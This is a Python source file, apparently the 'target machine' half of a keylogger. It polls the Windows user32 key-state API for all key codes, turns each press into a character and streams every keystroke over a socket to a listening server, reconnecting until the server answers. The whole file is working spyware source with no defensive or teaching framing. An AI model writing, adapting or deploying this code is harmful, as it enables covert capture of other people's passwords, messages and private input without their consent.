#target_machine

import socket 
import ctypes
import time

#connect socket to server: 
serverAddress = ('127.0.0.1', 4444)
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect_to_server():
    try:
        clientsocket.connect(serverAddress)
    except socket.error:
        time.sleep(5)
        connect_to_server()

connect_to_server()

#upload user32.dll to capture key's stat:
user32 = ctypes.windll.user32

#translate the ascii to letters:
def getKey(code):
    try:

        #vk codes used by windows api(user32.dll)
        asciitable = {
            "0": "[NUL]", "1": "[LCLICK]", "2": "[RCLICK]", "3": "[ETX]", "4": "[SCROLLCLICK]",
            "5": "[ENQ]", "6": "[ACK]", "7": "[BEL]", "8": "[BACKSPACE]", "9": "[TAB]",
            "10": "[LF]", "11": "[VT]", "12": "[CLEAR]", "13": "[ENTER]", "14": "[SO]", "15": "[SI]",
            "16": "", "17": "[RALT]", "18": "[LALT]", "19": "[PAUSEBREAK]", "20": "[CAPSLOCK]",
            "21": "[NAK]", "22": "[SYN]", "23": "[ETB]", "24": "[CAN]", "25": "[EM]",
            "26": "[SUB]", "27": "[ESC]", "28": "[FS]", "29": "[GS]", "30": "[RS]",
            "31": "[US]", "32": "[SPACE]", "33": "[PAGEUP]", "34": "[PAGEDOWN]", "35": "[END]",
            "36": "[HOME]", "37": "[LEFT]", "38": "[UP]", "39": "[RIGHT]", "40": "[DOWN]",
            "41": ")", "42": "*", "43": "+", "44": "[PRTSC]", "45": "[INSERT]",
            "46": "[DELETE]", "47": "/", "48": "0", "49": "1", "50": "2",
            "51": "3", "52": "4", "53": "5", "54": "6", "55": "7",
            "56": "8", "57": "9", "58": ":", "59": ";", "60": "<",
            "61": "=", "62": ">", "63": "?", "64": "@", "65": "A",
            "66": "B", "67": "C", "68": "D", "69": "E", "70": "F",
            "71": "G", "72": "H", "73": "I", "74": "J", "75": "K", 
            "76": "L", "77": "M", "78": "N", "79": "O", "80": "P",
            "81": "Q", "82": "R", "83": "S", "84": "T", "85": "U",
            "86": "V", "87": "W", "88": "X", "89": "Y", "90": "Z",
            "91": "[WIN]", "92": "\\", "93": "]", "94": "^", "95": "_",
            "96": "0", "97": "1", "98": "2", "99": "3", "100": "4",
            "101": "5", "102": "6", "103": "7", "104": "8", "105": "9",
            "106": "*", "107": "+", "108": "l", "109": "-", "110": ".",
            "111": "/", "112": "[F1]", "113": "[F2]", "114": "[F3]", "115": "[F4]",
            "116": "[F5]", "117": "[F6]", "118": "[F7]", "119": "[F8]", "120": "[F9]",
            "121": "[F10]", "122": "[F11]", "123": "[F12]", "124": "|", "125": "}",
            "126": "~", "145": "[SCROOLLOCK]", "144": "[NUMLOCK]", "160": "[LSHIFT]", "161": "[RSHIFT]",
            "162": "[LCTRL]", "163": "[RCTRL]", "190": ".", "191": "/", "188": ",",
            "186": ";", "189": "-", "187": "=", "165": "", "164": "",
            "192": "`", "222": "'", "220": "\\", "219": "[", "221": "]"
        }
    
        return asciitable.get(code, "[UNKNOWN]")

    except KeyError:
        
        return "[UNKNOWN]"


def main():
    keyStates = {}
    try:

        while True:
            for i in range(256):
                if user32.GetAsyncKeyState(i) & 0x8000 != 0:            #if the key is being clicked
                    if keyStates.get(i,False) == False:                 #to avoid the hold on key
                        keyStates[i] = True
                        key = getKey(str(i))

                        if user32.GetKeyState(0x14) & 0x0001 == 0:  #Caps locks off
                            key = key.lower()

                        clientsocket.sendall(key.encode())
            
                else:
                    keyStates[i] = False
    
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        clinetsocket.close()
        print("exitting...")


if __name__ == "__main__":
    main()



